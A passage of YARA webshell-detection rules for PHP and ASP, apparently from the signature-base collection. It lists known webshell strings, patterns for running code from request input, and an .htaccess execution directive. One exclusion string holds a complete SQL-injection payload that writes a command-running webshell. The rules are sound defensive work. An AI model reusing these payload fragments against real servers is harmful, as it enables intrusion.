$gen_much_sus79 = "disabled_suhosin" wide ascii
$gen_much_sus80 = "fopen(\".htaccess\",\"w" wide ascii
$gen_much_sus81 = /strrev\(['"]/ wide ascii
$gen_much_sus82 = "PHPShell" fullword wide ascii
$gen_much_sus821= "PHP Shell" fullword wide ascii
$gen_much_sus83 = "phpshell" fullword wide ascii
$gen_much_sus84 = "PHPshell" fullword wide ascii
$gen_much_sus87 = "deface" wide ascii
$gen_much_sus88 = "Deface" wide ascii
$gen_much_sus89 = "backdoor" wide ascii
$gen_much_sus90 = "r00t" fullword wide ascii
$gen_much_sus91 = "xp_cmdshell" fullword wide ascii
$gif = { 47 49 46 38 }
$fp1 = "# Some examples from obfuscated malware:" ascii
condition:
filesize < 500KB and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50 or
1 of ($fp*)
)
and (
any of ( $new_php* ) or
$php_short at 0
)
and (
any of ( $dynamic* )
)
and
( (
$gif at 0 or
(
filesize < 4KB and
(
1 of ( $gen_much_sus* ) or
2 of ( $gen_bit_sus* )
)
) or (
filesize < 20KB and
(
2 of ( $gen_much_sus* ) or
3 of ( $gen_bit_sus* )
)
) or (
filesize < 50KB and
(
2 of ( $gen_much_sus* ) or
4 of ( $gen_bit_sus* )
)
) or (
filesize < 100KB and
(
2 of ( $gen_much_sus* ) or
6 of ( $gen_bit_sus* )
)
) or (
filesize < 150KB and
(
3 of ( $gen_much_sus* ) or
7 of ( $gen_bit_sus* )
)
) or (
filesize < 500KB and
(
4 of ( $gen_much_sus* ) or
8 of ( $gen_bit_sus* )
)
)
) or (
// file shouldn't be too small to have big enough data for math.entropy
filesize > 2KB and
(
// base64 :
// ignore first and last 500bytes because they usually contain code for decoding and executing
math.entropy(500, filesize-500) >= 5.7 and
// encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
math.mean(500, filesize-500) > 80 and
// deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
// lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
// 89 is the mean of the base64 chars
math.deviation(500, filesize-500, 89.0) < 23
) or (
// gzinflated binary sometimes used in php webshells
// ignore first and last 500bytes because they usually contain code for decoding and executing
math.entropy(500, filesize-500) >= 7.7 and
// encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
math.mean(500, filesize-500) > 120 and
math.mean(500, filesize-500) < 136 and
// deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
// lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
// 89 is the mean of the base64 chars
math.deviation(500, filesize-500, 89.0) > 65
)
)
)
}
rule SSC_Swebshell_php_encoded_big
{
meta:
description = "PHP webshell using some kind of eval with encoded blob to decode"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/02/07"
score = 50
hash = "1d4b374d284c12db881ba42ee63ebce2759e0b14"
strings:
//strings from private rule capa_php_new
$new_php1 = /<\?=[\w\s@$]/ wide ascii
$new_php2 = "<?php" nocase wide ascii
$new_php3 = "<script language=\"php" nocase wide ascii
$php_short = "<?"
//strings from private rule capa_php_payload
// \([^)] to avoid matching on e.g. eval() in comments
$cpayload1 = /\beval[\t ]*\([^)]/ nocase wide ascii
$cpayload2 = /\bexec[\t ]*\([^)]/ nocase wide ascii
$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase wide ascii
$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase wide ascii
$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase wide ascii
$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase wide ascii
$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase wide ascii
$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase wide ascii
$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase wide ascii
$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase wide ascii
$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase wide ascii
$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase wide ascii
$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase wide ascii
$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
// TODO backticks
condition:
filesize < 1000KB and (
any of ( $new_php* ) or
$php_short at 0
)
and (
any of ( $cpayload* ) or
all of ( $m_cpayload_preg_filter* )
)
and (
// file shouldn't be too small to have big enough data for math.entropy
filesize > 2KB and
(
// base64 :
// ignore first and last 500bytes because they usually contain code for decoding and executing
math.entropy(500, filesize-500) >= 5.7 and
// encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
math.mean(500, filesize-500) > 80 and
// deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
// lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
// 89 is the mean of the base64 chars
math.deviation(500, filesize-500, 89.0) < 23
) or (
// gzinflated binary sometimes used in php webshells
// ignore first and last 500bytes because they usually contain code for decoding and executing
math.entropy(500, filesize-500) >= 7.7 and
// encoded text has a higher mean than text or code because it's missing the spaces and special chars with the low numbers
math.mean(500, filesize-500) > 120 and
math.mean(500, filesize-500) < 136 and
// deviation of base64 is ~20 according to CyberChef_v9.21.0.html#recipe=Generate_Lorem_Ipsum(3,'Paragraphs')To_Base64('A-Za-z0-9%2B/%3D')To_Charcode('Space',10)Standard_Deviation('Space')
// lets take a bit more because it might not be pure base64 also include some xor, shift, replacement, ...
// 89 is the mean of the base64 chars
math.deviation(500, filesize-500, 89.0) > 65
)
)
}
rule SSC_Swebshell_php_generic_backticks
{
meta:
description = "Generic PHP webshell which uses backticks directly on user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "339f32c883f6175233f0d1a30510caa52fdcaa37"
strings:
$backtick = /`[\t ]*\$(_POST\[|_GET\[|_REQUEST\[|_SERVER\['HTTP_)/ wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
(
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and $backtick and filesize < 200
}
rule SSC_Swebshell_php_generic_backticks_obfuscated
{
meta:
description = "Generic PHP webshell which uses backticks directly on user input"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "23dc299f941d98c72bd48659cdb4673f5ba93697"
date = "2021/01/07"
strings:
$s1 = /echo[\t ]*\(?`\$/ wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
condition:
filesize < 500 and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and $s1
}
rule SSC_Swebshell_php_by_string_known_webshell
{
meta:
description = "Known PHP Webshells which contain unique strings, lousy rule for low hanging fruits. Most are catched by other rules in here but maybe these catch different versions."
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/09"
hash = "d889da22893536d5965541c30896f4ed4fdf461d"
hash = "10f4988a191774a2c6b85604344535ee610b844c1708602a355cf7e9c12c3605"
hash = "7b6471774d14510cf6fa312a496eed72b614f6fc"
strings:
$pbs1 = "b374k shell" wide ascii
$pbs2 = "b374k/b374k" wide ascii
$pbs3 = "\"b374k" wide ascii
$pbs4 = "$b374k(\"" wide ascii
$pbs5 = "b374k " wide ascii
$pbs6 = "0de664ecd2be02cdd54234a0d1229b43" wide ascii
$pbs7 = "pwnshell" wide ascii
$pbs8 = "reGeorg" fullword wide ascii
$pbs9 = "Georg says, 'All seems fine" fullword wide ascii
$pbs10 = "My PHP Shell - A very simple web shell" wide ascii
$pbs11 = "<title>My PHP Shell <?echo VERSION" wide ascii
$pbs12 = "F4ckTeam" fullword wide ascii
$pbs15 = "MulCiShell" fullword wide ascii
// crawler avoid string
$pbs30 = "bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww" wide ascii
// <?=($pbs_=@$_GET[2]).@$_($_GET[1])?>
$pbs35 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
$pbs36 = /@\$_GET\s?\[\d\]\)\.@\$_\(\$_POST\s?\[\d\]\)/ wide ascii
$pbs37 = /@\$_POST\s?\[\d\]\)\.@\$_\(\$_GET\s?\[\d\]\)/ wide ascii
$pbs38 = /@\$_POST\[\d\]\)\.@\$_\(\$_POST\[\d\]\)/ wide ascii
$pbs39 = /@\$_REQUEST\[\d\]\)\.@\$_\(\$_REQUEST\[\d\]\)/ wide ascii
$pbs42 = "array(\"find config.inc.php files\", \"find / -type f -name config.inc.php\")" wide ascii
$pbs43 = "$_SERVER[\"\\x48\\x54\\x54\\x50" wide ascii
$pbs52 = "preg_replace(\"/[checksql]/e\""
$pbs53 = "='http://www.zjjv.com'"
$pbs54 = "=\"http://www.zjjv.com\""
$pbs60 = /setting\["AccountType"\]\s?=\s?3/
$pbs61 = "~+d()\"^\"!{+{}"
$pbs62 = "use function \\eval as "
$pbs63 = "use function \\assert as "
$front1 = "<?php eval(" nocase wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_bin_files
$dex   = { 64 65 ( 78 | 79 ) 0a 30 }
$pack  = { 50 41 43 4b 00 00 00 02 00 }
condition:
filesize < 500KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and not (
uint16(0) == 0x5a4d or
$dex at 0 or
$pack at 0 or
// fp on jar with zero compression
uint16(0) == 0x4b50
)
and
( any of ( $pbs* ) or $front1 in ( 0 .. 60 ) )
}
rule SSC_Swebshell_php_strings_susp
{
meta:
description = "typical webshell strings, suspicious"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
modified = "2022-08-18"
hash = "0dd568dbe946b5aa4e1d33eab1decbd71903ea04"
score = 50
strings:
$sstring1 = "eval(\"?>\"" nocase wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
//strings from private rule capa_php_input
$inp1 = "php://input" wide ascii
$inp2 = /_GET\s?\[/ wide ascii
// for passing $_GET to a function
$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
$inp4 = /_POST\s?\[/ wide ascii
$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
$inp6 = /_REQUEST\s?\[/ wide ascii
$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
// PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
$inp15 = "_SERVER['HTTP_" wide ascii
$inp16 = "_SERVER[\"HTTP_" wide ascii
$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
$inp18 = "array_values($_SERVER)" wide ascii
$inp19 = /file_get_contents\("https?:\/\// wide ascii
condition:
filesize < 700KB and (
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and not (
any of ( $gfp* )
)
and
( 1 of ( $sstring* ) and (
any of ( $inp* )
)
)
}
rule SSC_Swebshell_php_in_htaccess
{
meta:
description = "Use Apache .htaccess to execute php code inside .htaccess"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/07"
hash = "c026d4512a32d93899d486c6f11d1e13b058a713"
strings:
$hta = "AddType application/x-httpd-php .htaccess" wide ascii
condition:
filesize <100KB and $hta
}
rule SSC_Swebshell_php_function_via_get
{
meta:
description = "Webshell which sends eval/assert via GET"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
hash = "ce739d65c31b3c7ea94357a38f7bd0dc264da052d4fd93a1eabb257f6e3a97a6"
hash = "d870e971511ea3e082662f8e6ec22e8a8443ca79"
hash = "73fa97372b3bb829835270a5e20259163ecc3fdbf73ef2a99cb80709ea4572be"
date = "2021/01/09"
strings:
$sr0 = /\$_GET\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
$sr1 = /\$_POST\s?\[.{1,30}\]\(\$_GET\s?\[/ wide ascii
$sr2 = /\$_POST\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
$sr3 = /\$_GET\s?\[.{1,30}\]\(\$_POST\s?\[/ wide ascii
$sr4 = /\$_REQUEST\s?\[.{1,30}\]\(\$_REQUEST\s?\[/ wide ascii
$sr5 = /\$_SERVER\s?\[HTTP_.{1,30}\]\(\$_SERVER\s?\[HTTP_/ wide ascii
//strings from private rule php_false_positive
// try to use only strings which would be flagged by themselves as suspicious by other rules, e.g. eval
// a good choice is a string with good atom quality = ideally 4 unusual characters next to each other
$gfp1  = "eval(\"return [$serialised_parameter" // elgg
$gfp2  = "$this->assert(strpos($styles, $"
$gfp3  = "$module = new $_GET['module']($_GET['scope']);"
$gfp4  = "$plugin->$_POST['action']($_POST['id']);"
$gfp5  = "$_POST[partition_by]($_POST["
$gfp6  = "$object = new $_REQUEST['type']($_REQUEST['id']);"
$gfp7  = "The above example code can be easily exploited by passing in a string such as" // ... ;)
$gfp8  = "Smarty_Internal_Debug::start_render($_template);"
$gfp9  = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
$gfp11 = "(eval (getenv \"EPROLOG\")))"
$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
condition:
filesize < 500KB and not (
any of ( $gfp* )
)
and any of ( $sr* )
}
rule SSC_Swebshell_php_writer
{
meta:
description = "PHP webshell which only writes an uploaded file to disk"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/04/17"
score = 50
strings:
$sus4 = "\"upload\"" wide ascii
$sus5 = "\"Upload\"" wide ascii
$sus6 = "gif89" wide ascii
//$sus13= "<textarea " wide ascii
$sus16= "Army" fullword wide ascii
//strings from private rule capa_php_old_safe
$php_short = "<?" wide ascii
// prevent xml and asp from hitting with the short tag
$no_xml1 = "<?xml version" nocase wide ascii
$no_xml2 = "<?xml-stylesheet" nocase wide ascii
$no_asp1 = "<%@LANGUAGE" nocase wide ascii
$no_asp2 = /<script language="(vb|jscript|c#)/ nocase wide ascii
$no_pdf = "<?xpacket"
// of course the new tags should also match
// already matched by "<?"
$php_new1 = /<\?=[^?]/ wide ascii
$php_new2 = "<?php" nocase wide ascii
$php_new3 = "<script language=\"php" nocase wide ascii
//strings from private rule capa_php_input
$inp1 = "php://input" wide ascii
$inp2 = /_GET\s?\[/ wide ascii
// for passing $_GET to a function
$inp3 = /\(\s?\$_GET\s?\)/ wide ascii
$inp4 = /_POST\s?\[/ wide ascii
$inp5 = /\(\s?\$_POST\s?\)/ wide ascii
$inp6 = /_REQUEST\s?\[/ wide ascii
$inp7 = /\(\s?\$_REQUEST\s?\)/ wide ascii
// PHP automatically adds all the request headers into the $_SERVER global array, prefixing each header name by the "HTTP_" string, so e.g. @eval($_SERVER['HTTP_CMD']) will run any code in the HTTP header CMD
$inp15 = "_SERVER['HTTP_" wide ascii
$inp16 = "_SERVER[\"HTTP_" wide ascii
$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/ wide ascii
$inp18 = "array_values($_SERVER)" wide ascii
$inp19 = /file_get_contents\("https?:\/\// wide ascii
//strings from private rule capa_php_write_file
$php_multi_write1 = "fopen(" wide ascii
$php_multi_write2 = "fwrite(" wide ascii
$php_write1 = "move_uploaded_file" fullword wide ascii
condition:
(
(
(
$php_short in (0..100) or
$php_short in (filesize-1000..filesize)
)
and not any of ( $no_* )
)
or any of ( $php_new* )
)
and (
any of ( $inp* )
)
and (
any of ( $php_write* ) or
all of ( $php_multi_write* )
)
and
( filesize < 400 or
( filesize < 4000 and 1 of ( $sus* ) ) )
}
rule SSC_Swebshell_asp_writer
{
meta:
description = "ASP webshell which only writes an uploaded file to disk"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/03/07"
score = 60
strings:
$sus1 = "password" fullword wide ascii
$sus2 = "pwd" fullword wide ascii
$sus3 = "<asp:TextBox" fullword nocase wide ascii
$sus4 = "\"upload\"" wide ascii
$sus5 = "\"Upload\"" wide ascii
$sus6 = "gif89" wide ascii
$sus7 = "\"&\"" wide ascii
$sus8 = "authkey" fullword wide ascii
$sus9 = "AUTHKEY" fullword wide ascii
$sus10= "test.asp" fullword wide ascii
$sus11= "cmd.asp" fullword wide ascii
$sus12= ".Write(Request." wide ascii
$sus13= "<textarea " wide ascii
$sus14= "\"unsafe" fullword wide ascii
$sus15= "'unsafe" fullword wide ascii
$sus16= "Army" fullword wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_input
// Request.BinaryRead
// Request.Form
$asp_input1 = "request" fullword nocase wide ascii
$asp_input2 = "Page_Load" fullword nocase wide ascii
// base64 of Request.Form(
$asp_input3 = "UmVxdWVzdC5Gb3JtK" fullword wide ascii
$asp_xml_http = "Microsoft.XMLHTTP" fullword nocase wide ascii
$asp_xml_method1 = "GET" fullword wide ascii
$asp_xml_method2 = "POST" fullword wide ascii
$asp_xml_method3 = "HEAD" fullword wide ascii
// dynamic form
$asp_form1 = "<form " wide ascii
$asp_form2 = "<Form " wide ascii
$asp_form3 = "<FORM " wide ascii
$asp_asp   = "<asp:" wide ascii
$asp_text1 = ".text" wide ascii
$asp_text2 = ".Text" wide ascii
//strings from private rule capa_asp_write_file
// $asp_write1 = "ADODB.Stream" wide ascii # just a string, can be easily obfuscated
$asp_always_write1 = /\.write/ nocase wide ascii
$asp_always_write2 = /\.swrite/ nocase wide ascii
//$asp_write_way_one1 = /\.open\b/ nocase wide ascii
$asp_write_way_one2 = "SaveToFile" fullword nocase wide ascii
$asp_write_way_one3 = "CREAtEtExtFiLE" fullword nocase wide ascii
$asp_cr_write1 = "CreateObject(" nocase wide ascii
$asp_cr_write2 = "CreateObject (" nocase wide ascii
$asp_streamwriter1 = "streamwriter" fullword nocase wide ascii
$asp_streamwriter2 = "filestream" fullword nocase wide ascii
condition:
(
(
any of ( $tagasp_long* ) or
// TODO :  yara_push_private_rules.py doesn't do private rules in private rules yet
any of ( $tagasp_classid* ) or
(
$tagasp_short1 and
$tagasp_short2 in ( filesize-100..filesize )
) or (
$tagasp_short2 and (
$tagasp_short1 in ( 0..1000 ) or
$tagasp_short1 in ( filesize-1000..filesize )
)
)
) and not (
(
any of ( $perl* ) or
$php1 at 0 or
$php2 at 0
) or (
( #jsp1 + #jsp2 + #jsp3 ) > 0 and ( #jsp4 + #jsp5 + #jsp6 + #jsp7 ) > 0
)
)
)
and (
any of ( $asp_input* ) or
(
$asp_xml_http and
any of ( $asp_xml_method* )
) or
(
any of ( $asp_form* ) and
any of ( $asp_text* ) and
$asp_asp
)
)
and (
any of ( $asp_always_write* ) and
(
any of ( $asp_write_way_one* ) and
any of ( $asp_cr_write* )
) or (
any of ( $asp_streamwriter* )
)
)
and
( filesize < 400 or
( filesize < 6000 and 1 of ( $sus* ) ) )
}
rule SSC_Swebshell_asp_obfuscated
{
meta:
description = "ASP webshell obfuscated"
license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
author = "Arnim Rupp"
date = "2021/01/12"
modified = "2023-01-06"
strings:
$asp_obf1 = "/*-/*-*/" wide ascii
$asp_obf2 = "u\"+\"n\"+\"s" wide ascii
$asp_obf3 = "\"e\"+\"v" wide ascii
$asp_obf4 = "a\"+\"l\"" wide ascii
$asp_obf5 = "\"+\"(\"+\"" wide ascii
$asp_obf6 = "q\"+\"u\"" wide ascii
$asp_obf7 = "\"u\"+\"e" wide ascii
$asp_obf8 = "/*//*/" wide ascii
//strings from private rule capa_asp
$tagasp_short1 = /<%[^"]/ wide ascii
// also looking for %> to reduce fp (yeah, short atom but seldom since special chars)
$tagasp_short2 = "%>" wide ascii
// classids for scripting host etc
$tagasp_classid1 = "72C24DD5-D70A-438B-8A42-98424B88AFB8" nocase wide ascii
$tagasp_classid2 = "F935DC22-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid3 = "093FF999-1EA0-4079-9525-9614C3504B74" nocase wide ascii
$tagasp_classid4 = "F935DC26-1CF0-11D0-ADB9-00C04FD58A0B" nocase wide ascii
$tagasp_classid5 = "0D43FE01-F093-11CF-8940-00A0C9054228" nocase wide ascii
$tagasp_long10 = "<%@ " wide ascii
// <% eval
$tagasp_long11 = /<% \w/ nocase wide ascii
$tagasp_long12 = "<%ex" nocase wide ascii
$tagasp_long13 = "<%ev" nocase wide ascii
// <%@ LANGUAGE = VBScript.encode%>
// <%@ Language = "JScript" %>
// <%@ WebHandler Language="C#" class="Handler" %>
// <%@ WebService Language="C#" Class="Service" %>
// <%@Page Language="Jscript"%>
// <%@ Page Language = Jscript %>
// <%@PAGE LANGUAGE=JSCRIPT%>
// <%@ Page Language="Jscript" validateRequest="false" %>
// <%@ Page Language = Jscript %>
// <%@ Page Language="C#" %>
// <%@ Page Language="VB" ContentType="text/html" validaterequest="false" AspCompat="true" Debug="true" %>
// <script runat="server" language="JScript">
// <SCRIPT RUNAT=SERVER LANGUAGE=JSCRIPT>
// <SCRIPT  RUNAT=SERVER  LANGUAGE=JSCRIPT>
// <msxsl:script language="JScript" ...
$tagasp_long20 = /<(%|script|msxsl:script).{0,60}language="?(vb|jscript|c#)/ nocase wide ascii
$tagasp_long32 = /<script\s{1,30}runat=/ wide ascii
$tagasp_long33 = /<SCRIPT\s{1,30}RUNAT=/ wide ascii
// avoid hitting php
$php1 = "<?php"
$php2 = "<?="
// avoid hitting jsp
$jsp1 = "=\"java." wide ascii
$jsp2 = "=\"javax." wide ascii
$jsp3 = "java.lang." wide ascii
$jsp4 = "public" fullword wide ascii
$jsp5 = "throws" fullword wide ascii
$jsp6 = "getValue" fullword wide ascii
$jsp7 = "getBytes" fullword wide ascii
$perl1 = "PerlScript" fullword
//strings from private rule capa_asp_payload
$asp_payload0  = "eval_r" fullword nocase wide ascii
$asp_payload1  = /\beval\s/ nocase wide ascii
$asp_payload2  = /\beval\(/ nocase wide ascii
$asp_payload3  = /\beval\"\"/ nocase wide ascii
// var Fla = {'E':eval};  Fla.E(code)
$asp_payload4  = /:\s{0,10}eval\b/ nocase wide ascii
$asp_payload8  = /\bexecute\s?\(/ nocase wide ascii
$asp_payload9  = /\bexecute\s[\w"]/ nocase wide ascii
$asp_payload11 = "WSCRIPT.SHELL" fullword nocase wide ascii
$asp_payload13 = "ExecuteGlobal" fullword nocase wide ascii
$asp_payload14 = "ExecuteStatement" fullword nocase wide ascii
$asp_payload15 = "ExecuteStatement" fullword nocase wide ascii
$asp_multi_payload_one1 = "CreateObject" nocase fullword wide ascii
$asp_multi_payload_one2 = "addcode" fullword wide ascii
$asp_multi_payload_one3 = /\.run\b/ wide ascii
$asp_multi_payload_two1 = "CreateInstanceFromVirtualPath" fullword wide ascii
$asp_multi_payload_two2 = "ProcessRequest" fullword wide ascii
$asp_multi_payload_two3 = "BuildManager" fullword wide ascii
